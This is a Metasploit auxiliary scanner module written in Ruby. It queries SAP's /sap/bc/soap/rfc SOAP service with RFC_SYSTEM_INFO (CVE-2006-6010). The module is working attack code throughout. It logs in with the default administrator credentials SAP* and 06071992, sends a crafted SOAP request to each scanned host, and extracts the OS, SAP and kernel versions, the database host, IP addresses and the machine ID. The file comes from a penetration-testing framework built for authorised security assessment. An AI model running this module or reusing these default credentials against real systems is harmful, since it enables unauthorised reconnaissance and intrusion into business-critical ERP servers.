##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy. I'd also like to thank Chris John Riley,
# Ian de Villiers and Joris van de Vis who have Beta tested the modules and
# provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'SAP /sap/bc/soap/rfc SOAP Service RFC_SYSTEM_INFO Function Sensitive Information Gathering',
			'Description' => %q{
				This module makes use of the RFC_SYSTEM_INFO Function to obtain the operating
				system version, SAP version, IP address and other information through the use of
				the /sap/bc/soap/rfc SOAP service.
			},
			'References' =>
				[
					[ 'CVE', '2006-6010' ],
					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
				],
			'Author' =>
				[
					'Agnivesh Sathasivam',
					'nmonkee'
				],
			'License' => MSF_LICENSE
			)
		register_options(
			[
				Opt::RPORT(8000),
				OptString.new('CLIENT', [true, 'SAP Client ', '001']),
				OptString.new('USERNAME', [true, 'Username', 'SAP*']),
				OptString.new('PASSWORD', [true, 'Password', '06071992']),
			], self.class)
	end

	def run_host(ip)
		client = datastore['CLIENT']
		data = '<?xml version="1.0" encoding="utf-8" ?>'
		data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
		data << '<env:Body>'
		data << '<n1:RFC_SYSTEM_INFO xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
		data << '<CURRENT_RESOURCES xsi:nil="true"></CURRENT_RESOURCES>'
		data << '<MAXIMAL_RESOURCES xsi:nil="true"></MAXIMAL_RESOURCES>'
		data << '<RECOMMENDED_DELAY xsi:nil="true"></RECOMMENDED_DELAY>'
		data << '<RFCSI_EXPORT xsi:nil="true"></RFCSI_EXPORT>'
		data << '</n1:RFC_SYSTEM_INFO>'
		data << '</env:Body>'
		data << '</env:Envelope>'
		user_pass = Rex::Text.encode_base64(datastore['USERNAME'] + ":" + datastore['PASSWORD'])
		print_status("[SAP] #{ip}:#{rport} - sending SOAP RFC_SYSTEM_INFO request")
		begin
			res = send_request_raw({
				'uri' => '/sap/bc/soap/rfc?sap-client=' + client + '&sap-language=EN',
				'method' => 'POST',
				'data' => data,
				'headers' =>
					{
						'Content-Length' => data.size.to_s,
						'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
						'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + client,
						'Authorization' => 'Basic ' + user_pass,
						'Content-Type' => 'text/xml; charset=UTF-8'
					}
				}, 45)
			if res and res.code != 500 and res.code != 200
				# to do - implement error handlers for each status code, 404, 301, etc.
				print_error("[SAP] #{ip}:#{rport} - something went wrong!")
				return
			end
		rescue ::Rex::ConnectionError
			print_error("[SAP] #{ip}:#{rport} - Unable to connect")
			return
		end
		print_status("[SAP] #{ip}:#{rport} - got response")
		saptbl = Msf::Ui::Console::Table.new(
			Msf::Ui::Console::Table::Style::Default,
				'Header' => "[SAP] System Info",
				'Prefix' => "\n",
				'Postfix' => "\n",
				'Indent' => 1,
				'Columns' =>[
					"Info",
					"Value"
					])
		response = res.body
		rfcproto = $1 if response =~ /<RFCPROTO>(.*)<\/RFCPROTO>/i
		rfcchartyp = $1 if response =~ /<RFCCHARTYP>(.*)<\/RFCCHARTYP>/i
		rfcinttyp = $1 if response =~ /<RFCINTTYP>(.*)<\/RFCINTTYP>/i
		rfcflotyp = $1 if response =~ /<RFCFLOTYP>(.*)<\/RFCFLOTYP>/i
		rfcdest =  $1 if response =~ /<RFCDEST>(.*)<\/RFCDEST>/i
		rfchost =  $1 if response =~ /<RFCHOST>(.*)<\/RFCHOST>/i
		rfcsysid = $1 if response =~ /<RFCSYSID>(.*)<\/RFCSYSID>/i
		rfcdbhost = $1 if response =~ /<RFCDBHOST>(.*)<\/RFCDBHOST>/i
		rfcdbsys = $1 if response =~ /<RFCDBSYS>(.*)<\/RFCDBSYS>/i
		rfcsaprl =  $1 if response =~ /<RFCSAPRL>(.*)<\/RFCSAPRL>/i
		rfcmach =  $1 if response =~ /<RFCMACH>(.*)<\/RFCMACH>/i
		rfcopsys = $1 if response =~ /<RFCOPSYS>(.*)<\/RFCOPSYS>/i
		rfctzone = $1 if response =~ /<RFCTZONE>(.*)<\/RFCTZONE>/i
		rfcdayst = $1 if response =~ /<RFCDAYST>(.*)<\/RFCDAYST>/i
		rfcipaddr = $1 if response =~ /<RFCIPADDR>(.*)<\/RFCIPADDR>/i
		rfckernrl = $1 if response =~ /<RFCKERNRL>(.*)<\/RFCKERNRL>/i
		rfcipv6addr = $1 if response =~ /<RFCIPV6ADDR>(.*)<\/RFCIPV6ADDR>/i
		saptbl << [ "Release Status of SAP System", rfcsaprl ]
		saptbl << [ "RFC Log Version", rfcproto ]
		saptbl << [ "Kernel Release", rfckernrl ]
		saptbl << [ "Operating System", rfcopsys ]
		saptbl << [ "Database Host", rfcdbhost]
		saptbl << [ "Central Database System", rfcdbsys ]
		if rfcinttyp  == 'LIT'
			saptbl << [ "Integer Format", "Little Endian" ]
		else
			saptbl << [ "Integer Format", "Big Endian" ]
		end
			saptbl << [ "Hostname", rfchost ]
		if rfcflotyp == 'IE3'
			saptbl << [ "Float Type Format", "IEEE" ]
		else
			saptbl << [ "Float Type Format", "IBM/370" ]
		end
		saptbl << [ "IPv4 Address", rfcipaddr ]
		saptbl << [ "IPv6 Address", rfcipv6addr ]
		saptbl << [ "System ID", rfcsysid ]
		saptbl << [ "RFC Destination", rfcdest ]
		saptbl << [ "Timezone", "#{rfctzone.gsub(/\s+/, "")} (diff from UTC in seconds)" ]
		saptbl << [ "Character Set", rfcchartyp ]
		saptbl << [ "Daylight Saving Time", rfcdayst ]
		saptbl << [ "Machine ID", rfcmach.gsub(/\s+/, "")]
		print(saptbl.to_s)

		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:sname => 'sap',
			:type => 'sap.version.release',
			:data => "Release Status of SAP System: #{rfcsaprl}"
		)

		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:sname => 'sap',
			:type => 'sap.version.rfc_log',
			:data => "RFC Log Version: #{rfcproto}"
		)

		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:sname => 'sap',
			:type => 'sap.version.kernel',
			:data => "Kernel Release: #{rfckernrl}"
		)

		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:sname => 'sap',
			:type => 'system.os',
			:data => "Operating System: #{rfcopsys}"
		)

		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:type => 'sap.db.hostname',
			:data => "Database Host: #{rfcdbhost}"
		)

		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:type => 'sap.db_system',
			:data => "Central Database System: #{rfcdbsys}"
		)

		if rfcinttyp  == 'LIT'
			report_note(
				:host => ip,
				:proto => 'tcp',
				:port => rport,
				:type => 'system.endianness',
				:data => "Integer Format: Little Endian"
			)
		else
			report_note(
				:host => ip,
				:proto => 'tcp',
				:port => rport,
				:type => 'system.endianness',
				:data => "Integer Format: Big Endian"
			)
		end

		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:type => 'system.hostname',
			:data => "Hostname: #{rfchost}"
		)

		if rfcflotyp == 'IE3'
			report_note(
				:host => ip,
				:proto => 'tcp',
				:port => rport,
				:type => 'system.float_type',
				:data => "Float Type Format: IEEE"
			)
		else
			report_note(
				:host => ip,
				:proto => 'tcp',
				:port => rport,
				:type => 'system.float_type',
				:data => "Float Type Format: IBM/370"
			)
		end

		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:type => 'system.ip.v4',
			:data => "IPv4 Address: #{rfcipaddr}"
		)

		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:type => 'system.ip.v6',
			:data => "IPv6 Address: #{rfcipv6addr}"
		)

		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:type => 'sap.instance',
			:data => "System ID: #{rfcsysid}"
		)

		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:type => 'sap.rfc.destination',
			:data => "RFC Destination: #{rfcdest}"
		)

		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:type => 'system.timezone',
			:data => "Timezone: #{rfctzone.gsub(/\s+/, "")} (diff from UTC in seconds)"
		)

		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:type => 'system.charset',
			:data => "Character Set: #{rfcchartyp}"
		)

		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:type => 'sap.daylight_saving_time',
			:data => "Daylight Saving Time: #{rfcdayst}"
		)


		report_note(
			:host => ip,
			:proto => 'tcp',
			:port => rport,
			:type => 'sap.machine_id',
			:data => "Machine ID: #{rfcmach.gsub(/\s+/, "")}"
		)
	end
end
